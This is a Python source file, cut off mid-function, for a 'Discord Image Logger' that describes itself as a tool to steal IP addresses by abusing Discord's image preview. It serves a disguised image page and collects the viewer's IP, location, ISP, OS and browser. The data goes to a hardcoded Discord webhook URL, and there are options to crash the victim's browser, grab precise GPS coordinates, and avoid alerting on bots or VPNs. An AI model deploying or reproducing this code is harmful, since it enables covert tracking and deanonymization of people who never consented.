
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1445046943050105013/N07BJyAwE_ZiTCLKribw5_elfUfpF5AXtr55dhcu-ZKUX4cTW38vZJSDdcCdVRve4FxB",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
